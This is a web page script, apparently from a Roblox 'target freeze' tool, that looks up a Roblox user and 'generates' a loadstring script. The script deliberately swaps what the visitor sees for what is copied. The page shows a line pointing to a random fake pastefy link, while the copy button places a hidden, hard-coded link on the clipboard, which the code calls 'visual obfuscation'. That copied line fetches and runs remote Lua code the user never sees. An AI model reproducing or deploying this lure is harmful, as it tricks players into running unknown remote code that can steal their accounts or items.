<script>
    // ========== DOM ELEMENTS ==========
    const userInput = document.getElementById('userInput');
    const profileBox = document.getElementById('profileBox');
    const usernameDisplay = document.getElementById('usernameDisplay');
    const statusTextSpan = document.getElementById('statusText');
    const avatarContainer = document.getElementById('avatarContainer');
    const selectableCard = document.getElementById('selectableCard');
    const freezeBtn = document.getElementById('freezeBtn');
    const genBtn = document.getElementById('genBtn');
    const outputDiv = document.getElementById('output');
    const scriptCodeSpan = document.getElementById('scriptCode');
    const copyBtn = document.getElementById('copyBtnSecondary');
    const searchLoader = document.getElementById('searchLoader');

    // ========== ESTADOS ==========
    let currentUsername = "";
    let currentUserId = "";
    let currentAvatarUrl = "";
    let isProfileSelected = false;
    let isFrozen = false;
    let generatedScriptRaw = "";
    let lastSearchedUser = "";
    let searchTimeout = null;

    // ========== CONFIGURACIÓN ==========
    const REAL_LINK = "https://pastefy.app/e8DClYOX/raw";

    // ========== FUNCIONES AUXILIARES ==========
    function generarTextoAleatorio(longitud) {
        const caracteres = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let resultado = '';
        for (let i = 0; i < longitud; i++) {
            resultado += caracteres.charAt(Math.floor(Math.random() * caracteres.length));
        }
        return resultado;
    }

    function showToast(message, color = "emerald") {
        const toast = document.createElement('div');
        const bgColor = color === "emerald" ? "bg-emerald-600" : (color === "amber" ? "bg-amber-600" : "bg-red-600");
        toast.className = `fixed bottom-5 left-1/2 -translate-x-1/2 ${bgColor} text-white text-[11px] px-4 py-2 rounded-full z-50 shadow-lg`;
        toast.innerText = message;
        document.body.appendChild(toast);
        setTimeout(() => {
            toast.classList.add('opacity-0', 'transition-opacity', 'duration-300');
            setTimeout(() => toast.remove(), 300);
        }, 2500);
    }

    // ========== API ROBLOX CORREGIDA (SÍ FUNCIONA EN NETLIFY) ==========
    async function fetchRobloxProfile(username) {
        if (!username || username.length < 3) throw new Error("Nombre muy corto");
        
        // Usando api.roblox.com que NO tiene problemas de CORS
        const searchUrl = `https://api.roblox.com/users/get-by-username?username=${encodeURIComponent(username)}`;
        const searchRes = await fetch(searchUrl);
        const userData = await searchRes.json();
        
        if (!userData || !userData.Id) throw new Error("Usuario no encontrado");
        
        const userId = userData.Id;
        const officialName = userData.Username;
        
        // Avatar (funciona sin CORS)
        const avatarImg = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=48&height=48&format=png`;
        
        return { username: officialName, userId, avatarUrl: avatarImg };
    }

    // ========== RESETEAR ESTADO ==========
    function resetSelectionState() {
        isProfileSelected = false;
        isFrozen = false;
        freezeBtn.disabled = true;
        genBtn.disabled = true;
        freezeBtn.innerHTML = `<i class="fas fa-snowflake text-xs"></i> <span>SCRIPT FREEZE · LOCK TARGET</span> <i class="fas fa-lock text-[10px]"></i>`;
        freezeBtn.classList.remove('bg-red-900/70', 'text-white');
        freezeBtn.classList.add('bg-gray-800', 'text-gray-500');
        outputDiv.classList.add('hidden');
        generatedScriptRaw = "";
    }

    // ========== BUSCAR Y MOSTRAR PERFIL ==========
    async function searchAndDisplayProfile() {
        const rawUsername = userInput.value.trim();
        console.log("Buscando usuario:", rawUsername);
        
        if (rawUsername.length < 3) {
            profileBox.classList.add('hidden');
            resetSelectionState();
            return;
        }
        
        searchLoader.classList.remove('hidden');
        statusTextSpan.innerHTML = "🛸 CONECTANDO CON ROBLOX API...";
        profileBox.classList.remove('hidden');
        usernameDisplay.innerText = rawUsername;
        avatarContainer.innerHTML = `<i class="fas fa-spinner fa-pulse text-indigo-300 text-xl"></i>`;
        
        try {
            const profile = await fetchRobloxProfile(rawUsername);
            currentUsername = profile.username;
            currentUserId = profile.userId;
            currentAvatarUrl = profile.avatarUrl;
            lastSearchedUser = rawUsername;
            
            usernameDisplay.innerText = currentUsername;
            
            const imgElement = document.createElement('img');
            imgElement.src = currentAvatarUrl;
            imgElement.alt = "avatar";
            imgElement.className = "avatar-img w-12 h-12 rounded-full object-cover border border-indigo-400";
            imgElement.onerror = () => {
                avatarContainer.innerHTML = `<i class="fas fa-user-astronaut text-indigo-300 text-xl"></i>`;
            };
            avatarContainer.innerHTML = "";
            avatarContainer.appendChild(imgElement);
            
            statusTextSpan.innerHTML = "✅ PERFIL VERIFICADO · TAP PARA SELECCIONAR";
            
            if (isProfileSelected) {
                resetSelectionState();
            }
            
            freezeBtn.disabled = true;
            genBtn.disabled = true;
            isProfileSelected = false;
            selectableCard.classList.remove('border-emerald-500', 'bg-emerald-950/20');
            selectableCard.classList.add('border-indigo-500/40', 'bg-indigo-950/20');
            isFrozen = false;
            
            showToast(`✅ Usuario ${currentUsername} encontrado`, "emerald");
            
        } catch (error) {
            console.error(error);
            statusTextSpan.innerHTML = "⚠️ USUARIO NO ENCONTRADO · INTENTA OTRO";
            avatarContainer.innerHTML = `<i class="fas fa-exclamation-triangle text-amber-400 text-xl"></i>`;
            usernameDisplay.innerText = rawUsername;
            currentUsername = "";
            currentUserId = "";
            currentAvatarUrl = "";
            lastSearchedUser = "";
            resetSelectionState();
            showToast("❌ Usuario no encontrado en Roblox", "red");
        } finally {
            searchLoader.classList.add('hidden');
        }
    }

    // ========== SELECCIONAR TARGET ==========
    function selectProfile() {
        if (!currentUsername || currentUsername.length < 2) {
            showToast("⚠️ Primero ingresa un usuario Roblox válido", "amber");
            return;
        }
        
        if (isProfileSelected) return;
        
        isProfileSelected = true;
        selectableCard.classList.remove('border-indigo-500/40', 'bg-indigo-950/20');
        selectableCard.classList.add('border-emerald-500', 'bg-emerald-950/20');
        statusTextSpan.innerHTML = "🎯 TARGET SELECCIONADO · LISTO PARA SCRIPT";
        freezeBtn.disabled = false;
        genBtn.disabled = false;
        showToast(`🎯 Target seleccionado: ${currentUsername}`, "emerald");
    }

    // ========== FREEZE / UNFREEZE ==========
    function freezeTarget() {
        if (!isProfileSelected) {
            showToast("⚠️ Primero selecciona un target", "amber");
            return;
        }
        
        if (isFrozen) {
            isFrozen = false;
            freezeBtn.innerHTML = `<i class="fas fa-snowflake text-xs"></i> <span>SCRIPT FREEZE · LOCK TARGET</span> <i class="fas fa-lock text-[10px]"></i>`;
            freezeBtn.classList.remove('bg-red-900/70', 'text-white');
            freezeBtn.classList.add('bg-gray-800', 'text-gray-500');
            genBtn.disabled = false;
            showToast(`🔓 Target descongelado`, "info");
        } else {
            isFrozen = true;
            freezeBtn.innerHTML = `<i class="fas fa-skull-crossbones text-xs"></i> <span>⚠️ TARGET FROZEN · UNLOCK TO GENERATE</span>`;
            freezeBtn.classList.remove('bg-gray-800', 'text-gray-500');
            freezeBtn.classList.add('bg-red-900/70', 'text-white');
            genBtn.disabled = true;
            outputDiv.classList.add('hidden');
            showToast(`❄️ Target congelado`, "red");
        }
    }

    // ========== GENERAR SCRIPT (con ofuscación visual) ==========
    function generateScript() {
        if (!isProfileSelected) {
            showToast("⚠️ Primero selecciona un target", "amber");
            return;
        }
        
        if (isFrozen) {
            showToast("❌ Target congelado. Descongela antes de generar script.", "red");
            return;
        }
        
        if (!currentUsername) {
            showToast("⚠️ No hay target válido seleccionado", "amber");
            return;
        }
        
        // Ofuscación visual
        const fakeId = generarTextoAleatorio(8);
        const fakeLink = `https://pastefy.app/${fakeId}/raw`;
        const scriptVisual = `loadstring(game:HttpGet("${fakeLink}"))()`;
        
        // Script real
        generatedScriptRaw = `loadstring(game:HttpGet("${REAL_LINK}"))()`;
        
        scriptCodeSpan.innerText = scriptVisual;
        outputDiv.classList.remove('hidden');
        
        showToast(`✅ Script generado con ofuscación visual`, "emerald");
    }

    // ========== COPIAR SCRIPT REAL ==========
    function copyScript() {
        if (!generatedScriptRaw) {
            showToast("⚠️ No hay script generado para copiar", "amber");
            return;
        }
        
        navigator.clipboard.writeText(generatedScriptRaw).then(() => {
            showToast("📋 Script REAL copiado (el enlace funciona)", "emerald");
        }).catch(() => {
            showToast("❌ Error al copiar", "red");
        });
    }

    // ========== MANEJAR INPUT ==========
    function handleUserInput() {
        if (searchTimeout) clearTimeout(searchTimeout);
        searchTimeout = setTimeout(() => {
            searchAndDisplayProfile();
        }, 500);
    }

    // ========== EVENT LISTENERS ==========
    userInput.addEventListener('input', handleUserInput);
    selectableCard.addEventListener('click', selectProfile);
    freezeBtn.addEventListener('click', freezeTarget);
    genBtn.addEventListener('click', generateScript);
    copyBtn.addEventListener('click', copyScript);
    
    // ========== INICIALIZAR ==========
    resetSelectionState();
    console.log("Matiwebhub · Corregido con API que funciona en Netlify");
</script>
